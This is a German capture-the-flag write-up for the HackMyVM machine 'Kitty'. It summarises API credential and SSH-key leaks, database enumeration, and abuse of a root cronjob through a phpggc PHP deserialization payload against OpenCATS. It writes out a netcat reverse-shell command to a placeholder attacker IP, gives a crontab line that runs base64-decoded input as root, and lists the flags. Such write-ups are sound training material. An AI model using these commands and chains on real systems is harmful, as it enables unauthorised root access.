# Kitty - HackMyVM (Hard)

![Kitty.png](Kitty.png)

## Übersicht

*   **VM:** Kitty
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Kitty)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 18. April 2023
*   **Original-Writeup:** https://alientec1908.github.io/Kitty_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Kitty" zu erlangen. Der Weg zum initialen Zugriff führte über die Enumeration einer unsicheren API, die sowohl Benutzer-Credentials als auch einen privaten SSH-Schlüssel preisgab. Nach dem Login als Benutzer `dyutidhara` wurde durch weitere Enumeration (Datenbank-Analyse, Prozess-Monitoring) ein kritischer Cronjob entdeckt. Die finale Rechteausweitung zu Root erfolgte durch Ausnutzung einer PHP-Deserialisierungsschwachstelle in der OpenCATS-Webanwendung. Dies ermöglichte das Schreiben einer speziell präparierten Datei, die vom Cronjob verarbeitet wurde und zur Ausführung von Code als Root führte, wodurch eine Reverse Shell erlangt wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `wfuzz`
*   `vi`
*   `gobuster`
*   `hashcat`
*   `curl`
*   `ssh`
*   `find`
*   `chmod`
*   `pspy64`
*   `mysql`
*   `grep`
*   `wget`
*   `python3 http.server`
*   Metasploit (`msfconsole`)
*   `nc` (netcat)
*   `phpggc`
*   `base64`
*   Standard Linux-Befehle (`cat`, `ls`, `echo`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Kitty" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.150) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte SSH (Port 22), HTTP (Port 80, Nginx, Weiterleitung auf `kitty.hmv`) und einen weiteren HTTP-Dienst auf Port 3000 (später als API identifiziert).
    *   `nikto` auf Port 80 zeigte fehlende Sicherheitsheader.
    *   Mittels `wfuzz` wurde die Subdomain `cookie.kitty.hmv` entdeckt.
    *   `/etc/hosts` Einträge für `kitty.hmv` und `cookie.kitty.hmv` wurden hinzugefügt.
    *   `gobuster` auf `cookie.kitty.hmv` fand `/register.php`, `/login.php` und das Verzeichnis `/config/`.

2.  **API Enumeration & Initial Access (`dyutidhara`):**
    *   Analyse von Gitea-Logs (aus der Datenbank, später gefunden) oder Netzwerkanfragen führte zur Entdeckung der API-Domain `whythisapiissofast.kitty.hmv`.
    *   `/etc/hosts` Eintrag für `whythisapiissofast.kitty.hmv` hinzugefügt.
    *   `curl` auf `http://whythisapiissofast.kitty.hmv/api/v2/-1` lieferte Credentials: `nobody:74k3!7345y`.
    *   `curl` auf `http://whythisapiissofast.kitty.hmv/api/v2/-2` lieferte einen privaten SSH-Schlüssel für den Benutzer `dyutidhara`.
    *   Erfolgreicher SSH-Login als `dyutidhara@kitty.hmv` mit dem gefundenen Schlüssel. Die User-Flag wurde in `/home/dyutidhara/user.txt` gefunden.

3.  **Post-Exploitation & Privilege Escalation Vector Discovery:**
    *   `sudo -l` als `dyutidhara` war nicht erfolgreich, da das Passwort unbekannt war.
    *   `pspy64` wurde auf das Zielsystem hochgeladen und ausgeführt, was einen häufig als Root (`UID=0`) laufenden Cronjob (`/usr/sbin/CRN -f`) aufdeckte.
    *   Die Datei `/var/www/cookie/config/db.php` enthielt Datenbank-Credentials (`padding:ihateyouadmin`).
    *   Login in die MariaDB-Datenbank als `root` mit dem Passwort `root` (aus einem Kommentar in `db.php`, aber gültig).
    *   Enumeration der Datenbanken:
        *   `gitea.user`: Hash für Gitea-Admin.
        *   `gitea.action`: Kommentare enthielten Hinweise auf die Entdeckung der API und des SSH-Schlüssels.
        *   `padding.users`: MD5-Hashes für `admin` und `gitea`.
        *   `padding.salt`: Salt `YXZpam5leWFt` (verwendet mit dem `gitea` MD5-Hash).
    *   Analyse von `/etc/crontab` enthüllte den detaillierten Befehl des Root-Cronjobs:
        `* * * * * root [ -f /usr/local/etc/newfile.txt ] && /usr/bin/sed -e 's/\[{"Expires":1,"Discard":false,"Value":"//' -e 's/\\n"}]//' /usr/local/etc/newfile.txt > /usr/local/etc/payload.txt | for i in $(/usr/bin/cat /usr/local/etc/payload.txt); do /usr/bin/echo $i | /usr/bin/base64 -d | /usr/bin/bash; done`
        Dieser Cronjob führt Base64-dekodierten Inhalt aus `/usr/local/etc/payload.txt` (abgeleitet von `/usr/local/etc/newfile.txt`) als Root aus.
    *   Kein direkter Schreibzugriff auf `/usr/local/etc/newfile.txt` als `dyutidhara`.
    *   Untersuchung der Nginx-Konfiguration (`/etc/nginx/sites-enabled/opencats`) offenbarte eine weitere Webanwendung (OpenCATS) unter `thisisnotcatitisopencats.kitty.hmv` auf Port 80.
    *   `/etc/hosts` Eintrag für `thisisnotcatitisopencats.kitty.hmv` hinzugefügt.

4.  **Privilege Escalation (von `dyutidhara` zu `root` via PHP Deserialization & Cronjob):**
    *   Ein Base64-kodierter Reverse-Shell-Payload (`nc -e /bin/bash ANGRIFFS_IP PORT`) wurde erstellt und in `/tmp/newfile.txt` auf dem Zielsystem gespeichert.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet.
    *   Mit `phpggc` wurde ein serialisierter PHP-Payload für `Guzzle/FW1` generiert. Dieser Payload wurde so konstruiert, dass er bei der Deserialisierung den Inhalt von `/tmp/newfile.txt` nach `/usr/local/etc/newfile.txt` schreibt.
    *   Um Zugriff auf OpenCATS zu erhalten und einen potenziellen Deserialisierungs-Eingabepunkt zu finden, wurde das Passwort des `admin`-Benutzers in der `opencats`-Datenbank auf den MD5-Hash von "admin" geändert.
    *   Der `phpggc`-Payload wurde URL-kodiert und als GET-Parameter (`parametersactivity:ActivityDataGrid`) an eine URL der OpenCATS-Anwendung (`http://thisisnotcatitisopencats.kitty.hmv/index.php?m=activity`) gesendet.
    *   Die Deserialisierung des Payloads durch OpenCATS schrieb den Base64-Reverse-Shell-Code in `/usr/local/etc/newfile.txt`.
    *   Der Cronjob verarbeitete diese Datei, extrahierte und dekodierte den Base64-String und führte ihn als Root aus.
    *   Eine Root-Shell wurde auf dem Netcat-Listener des Angreifers empfangen.
    *   Die Root-Flag wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Unsichere API-Endpunkte:** Preisgabe von Klartext-Benutzerdaten (`nobody:74k3!7345y`) und eines privaten SSH-Schlüssels (`dyutidhara`) über ungesicherte API-Pfade.
*   **Schwache Datenbank-Credentials:** Das MariaDB-Root-Passwort war `root`. Datenbank-Credentials für die Webanwendung (`padding:ihateyouadmin`) wurden in einer Konfigurationsdatei im Web-Root gefunden.
*   **PHP Object Injection (Deserialisierung):** Eine Schwachstelle in der OpenCATS-Anwendung erlaubte die Deserialisierung eines bösartigen PHP-Objekts (erstellt mit `phpggc` für Guzzle), was zum Schreiben einer Datei auf dem System führte.
*   **Unsicherer Cronjob:** Ein minütlich als Root laufender Cronjob las eine Datei, verarbeitete deren Inhalt mit `sed` und führte dann jede Zeile als Base64-dekodierten Shell-Befehl aus. Dies ermöglichte RCE, sobald der Inhalt der Eingabedatei kontrolliert werden konnte.
*   **Subdomain & API Enumeration:** Auffinden versteckter Subdomains und API-Endpunkte durch Brute-Forcing und Analyse von Konfigurationsdateien/Logs.
*   **JWT-Analyse:** Untersuchung von JSON Web Tokens, die von der API zurückgegeben wurden (Algorithmus HS256, `is_admin`-Flag konnte nicht manipuliert werden).
*   **Kernel-Schwachstelle (Dirty Pipe - CVE-2022-0847):** Das System wurde als anfällig für Dirty Pipe identifiziert, obwohl dieser Vektor nicht für den finalen Exploit genutzt wurde.

## Flags

*   **User Flag (`/home/dyutidhara/user.txt`):** `3702f4d1247163b61b1cd8b368539cbf`
*   **Root Flag (`/root/root.txt`):** `3f798f4e70a832c64e8f6f1462b04d0f`

## Tags

`HackMyVM`, `Kitty`, `Hard`, `API Exploitation`, `SSH Key Leak`, `PHP Deserialization`, `Cronjob Exploit`, `Guzzle`, `phpggc`, `Linux`, `Web`, `Privilege Escalation`, `Database Enumeration`, `JWT`
